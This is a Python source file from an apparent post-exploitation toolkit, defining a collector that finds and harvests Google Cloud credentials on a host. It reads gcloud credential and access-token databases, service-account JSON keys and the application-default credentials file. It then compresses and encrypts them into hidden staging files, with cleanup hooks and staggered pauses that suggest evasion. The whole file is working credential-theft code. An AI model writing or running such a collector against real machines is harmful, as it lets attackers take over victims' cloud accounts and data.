from __future__ import annotations

import json
import logging
import os
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)


class GcpCollector(BaseCollector):
    """
    Collect GCP credentials and configurations.

    Targets:
      - ~/.config/gcloud/
      - GOOGLE_APPLICATION_CREDENTIALS path
      - Active configuration and project metadata
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        gcloud_dir = Path.home() / ".config" / "gcloud"
        adc_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS")

        if gcloud_dir.exists():
            for root, _, files in os.walk(gcloud_dir):
                for f in files:
                    if f in ("credentials.db", "active_config", "access_token.db"):
                        p = Path(root) / f
                        yield ArtifactMetadata(
                            artifact_family="gcp_config",
                            artifact_subtype=f"gcloud_{f}",
                            source_path=str(p),
                            source_platform=os.name,
                            collection_method="file_read",
                        )

        search_paths = [gcloud_dir]
        if adc_path:
            search_paths.append(Path(adc_path).parent)

        for path in search_paths:
            if path.exists():
                for root, _, files in os.walk(path):
                    for f in files:
                        if f.endswith(".json"):
                            p = Path(root) / f
                            # Basic check for a service account key file
                            try:
                                content = json.loads(p.read_text(encoding="utf-8"))
                            except (
                                OSError,
                                PermissionError,
                                UnicodeDecodeError,
                                json.JSONDecodeError,
                            ):
                                continue

                            if content.get("type") == "service_account":
                                yield ArtifactMetadata(
                                    artifact_family="gcp_credentials",
                                    artifact_subtype="service_account_key",
                                    source_path=str(p),
                                    source_platform=os.name,
                                    collection_method="file_read",
                                )

        active_config_path = gcloud_dir / "active_config"
        if active_config_path.exists():
            try:
                active_config = active_config_path.read_text().strip()
                config_path = gcloud_dir / "configurations" / f"config_{active_config}"
                if config_path.exists():
                    with open(config_path, "r", encoding="utf-8") as f:
                        for line in f:
                            if "project" in line and "=" in line:
                                project = line.split("=", 1)[1].strip()
                                yield ArtifactMetadata(
                                    artifact_family="gcp_context",
                                    artifact_subtype="active_project",
                                    source_path=str(config_path),
                                    source_platform=os.name,
                                    collection_method="api_call",
                                    report_safe_summary_fields={
                                        "active_configuration": active_config,
                                        "project_id": project,
                                    },
                                )
                                break
            except Exception:
                pass

        if adc_path:
            p = Path(adc_path)
            if p.exists():
                yield ArtifactMetadata(
                    artifact_family="gcp_credentials",
                    artifact_subtype="adc_json",
                    source_path=str(p),
                    source_platform=os.name,
                    collection_method="file_read",
                )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        try:
            path = Path(artifact.source_path)
            if not path.exists():
                return None

            data = path.read_bytes()
            sha256 = self._sha256(data)
            payload = self._compress_and_encrypt(data)
            del data

            ext = artifact.artifact_subtype or "gcp"
            stage_path = self._staging_dir / f".{sha256[:16]}.{ext}.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path=str(path),
                sha256=sha256,
                size_bytes=len(payload),
                metadata=artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("GCP collection error (%s): %s", artifact.source_path, exc)
        return None
